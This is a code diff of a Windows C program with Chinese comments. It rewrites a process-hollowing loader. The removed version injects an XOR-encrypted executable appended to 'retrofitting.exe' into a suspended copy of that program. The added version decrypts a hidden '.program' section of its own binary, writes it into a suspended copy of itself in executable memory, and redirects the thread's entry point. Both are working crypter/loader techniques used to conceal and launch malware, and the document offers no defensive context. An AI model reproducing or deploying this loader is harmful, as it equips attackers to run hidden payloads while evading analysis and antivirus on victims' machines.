@@ -1,67 +1,75 @@
-#include <iostream>
-#include <fstream>
-#include <vector>
 #include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
 
-using namespace std;
-
-void xormethod(vector<char>& data, char key) {
-    for (char& byte : data) {
-        byte ^= key;
+void xor_decrypt(unsigned char* data, size_t len, unsigned char key) {
+    for (size_t i = 0; i < len; i++) {
+        data[i] ^= key;
     }
 }
 
 int main() {
-    cout << "hello program2" << endl;
+    printf("hello program2！\n");
 
-    ifstream file("./retrofitting.exe", ios::binary | ios::ate);
-    SIZE_T fileSize = file.tellg(); 
-    file.seekg(0, ios::beg);         
-    vector<char> buffer(fileSize);  
-    file.read(buffer.data(), fileSize);
-    file.close();
+    // 获取句柄
+    HMODULE self = GetModuleHandle(NULL);
+    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)self;
+    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)((char*)self + dos->e_lfanew);
 
-    SIZE_T program1_size = 1921163;  // 1.83 MB (1,921,163 字节)
-    SIZE_T offset = fileSize - program1_size;
-    vector<char> Data(buffer.begin() + offset, buffer.begin() + offset + program1_size);
-
-    xormethod(Data, 0x40);
-
-    STARTUPINFOA si = { 0 };
-    PROCESS_INFORMATION pi = { 0 };
-    si.cb = sizeof(si);
-    CreateProcessA("./retrofitting.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
-
-    CONTEXT ctx;
-    ctx.ContextFlags = CONTEXT_FULL;
-    GetThreadContext(pi.hThread, &ctx);
-    LPVOID pebBase = (LPVOID)(ctx.Rdx);
-    LPVOID imageBase;
-    ReadProcessMemory(pi.hProcess, (PBYTE)pebBase + 0x10, &imageBase, sizeof(LPVOID), NULL);
-
-    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)Data.data();
-    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(Data.data() + dosHeader->e_lfanew);
-    LPVOID newImageBase = (LPVOID)(ntHeaders->OptionalHeader.ImageBase);
-
-    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-    auto NtUnmapViewOfSection = (NTSTATUS(WINAPI*)(HANDLE, PVOID))GetProcAddress(ntdll, "NtUnmapViewOfSection");
-    NtUnmapViewOfSection(pi.hProcess, imageBase);
-
-    LPVOID allocMem = VirtualAllocEx(pi.hProcess, newImageBase, program1_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-
-    WriteProcessMemory(pi.hProcess, allocMem, Data.data(), program1_size, NULL);
-
-    PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)(Data.data() + dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64));
-    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i, ++sectionHeader) {
-        LPVOID sectionAddr = (LPVOID)((ULONGLONG)allocMem + sectionHeader->VirtualAddress);
-        WriteProcessMemory(pi.hProcess, sectionAddr, Data.data() + sectionHeader->PointerToRawData, sectionHeader->SizeOfRawData, NULL);
+    // 查找 .program 节区
+    IMAGE_SECTION_HEADER* prog_sec = NULL;
+    IMAGE_SECTION_HEADER* section = IMAGE_FIRST_SECTION(nt);
+    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, section++) {
+        if (memcmp(section->Name, ".program", 8) == 0) {
+            prog_sec = section;
+            break;
+        }
     }
 
-    ctx.Rip = (ULONGLONG)allocMem + ntHeaders->OptionalHeader.AddressOfEntryPoint;
+    size_t data_size = prog_sec->SizeOfRawData;
+    unsigned char* decrypted_data = (unsigned char*)malloc(data_size);
+    memcpy(decrypted_data, (unsigned char*)self + prog_sec->VirtualAddress, data_size);
+    xor_decrypt(decrypted_data, data_size, 0x40);
 
+    // 创建挂起进程
+    WCHAR exe_path[MAX_PATH];
+    GetModuleFileNameW(NULL, exe_path, MAX_PATH);
+    
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    CreateProcessW(NULL, exe_path, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+
+    // 在目标进程分配内存并写入数据
+    IMAGE_DOS_HEADER* dos_header = (IMAGE_DOS_HEADER*)decrypted_data;
+    IMAGE_NT_HEADERS64* nt_header = (IMAGE_NT_HEADERS64*)(decrypted_data + dos_header->e_lfanew);
+    
+    LPVOID new_base = VirtualAllocEx(pi.hProcess, (LPVOID)nt_header->OptionalHeader.ImageBase, nt_header->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    // 写入PE头
+    WriteProcessMemory(pi.hProcess, new_base, decrypted_data, nt_header->OptionalHeader.SizeOfHeaders, NULL);
+
+    // 写入各个节区
+    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt_header);
+    for (int i = 0; i < nt_header->FileHeader.NumberOfSections; i++, sec++) {
+        if (sec->SizeOfRawData > 0) {
+            LPVOID sec_addr = (LPVOID)((char*)new_base + sec->VirtualAddress);
+            WriteProcessMemory(pi.hProcess, sec_addr, decrypted_data + sec->PointerToRawData, sec->SizeOfRawData, NULL);
+        }
+    }
+
+    // 设置入口点
+    CONTEXT ctx;
+    ctx.ContextFlags = CONTEXT_ALL;
+    GetThreadContext(pi.hThread, &ctx);
+    ctx.Rip = (ULONG_PTR)new_base + nt_header->OptionalHeader.AddressOfEntryPoint;
     SetThreadContext(pi.hThread, &ctx);
+    
     ResumeThread(pi.hThread);
 
+    free(decrypted_data);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    
     return 0;
 }
 
